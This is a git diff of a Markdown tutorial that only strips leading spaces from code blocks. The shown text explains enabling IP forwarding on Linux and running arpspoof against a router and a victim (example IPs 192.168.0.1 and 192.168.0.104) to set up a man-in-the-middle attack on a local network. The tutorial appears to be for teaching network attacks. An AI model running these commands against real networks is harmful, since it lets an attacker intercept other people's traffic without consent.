@@ -59,7 +59,7 @@ sudo sysctl -w net.ipv4.ip_forward=1
 or 
 
 ```console
- sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 ___
@@ -67,7 +67,7 @@ ___
 #### Permanent fowarding
 
 ```console
- sudo nano /etc/sysctl.conf
+sudo nano /etc/sysctl.conf
 ```
 
 then find the line:
@@ -95,7 +95,7 @@ then
 and finally run this to apply the changes:
 
 ```console
- sudo sysctl -p /etc/sysctl.conf
+sudo sysctl -p /etc/sysctl.conf
 ```
 
 ### Making a man in the middle with Arpspoof
@@ -103,7 +103,7 @@ and finally run this to apply the changes:
 To make this we will use this command two times:
 
 ```console
- sudo arpspoof -i {NETWORK_INTERFACE} -t {TARGET_IP} {IP_YOU_WILL_BE_PRETENDING_TO_BE}
+sudo arpspoof -i {NETWORK_INTERFACE} -t {TARGET_IP} {IP_YOU_WILL_BE_PRETENDING_TO_BE}
 ```
 
 ___
@@ -113,13 +113,13 @@ ___
 First to make the router think that our machine is the victim:
 
 ```console
- sudo arpspoof -i {NETWORK_INTERFACE} -t {ROUTER_IP} {VICTIM_IP}
+sudo arpspoof -i {NETWORK_INTERFACE} -t {ROUTER_IP} {VICTIM_IP}
 ```
 
 Example:
 
 ```console
- sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.104
+sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.104
 ```
 
 ___
@@ -129,13 +129,13 @@ ___
 Then we make the victim think that our machine is the router:
 
 ```console
- sudo arpspoof -i {NETWORK_INTERFACE} -t {VICTIM_IP} {ROUTER_IP}
+sudo arpspoof -i {NETWORK_INTERFACE} -t {VICTIM_IP} {ROUTER_IP}
 ```
 
 Example:
 
 ```console
- sudo arpspoof -i eth0 -t 192.168.0.104 192.168.0.1
+sudo arpspoof -i eth0 -t 192.168.0.104 192.168.0.1
 ```
 
 and with this we have a man in the middle set.
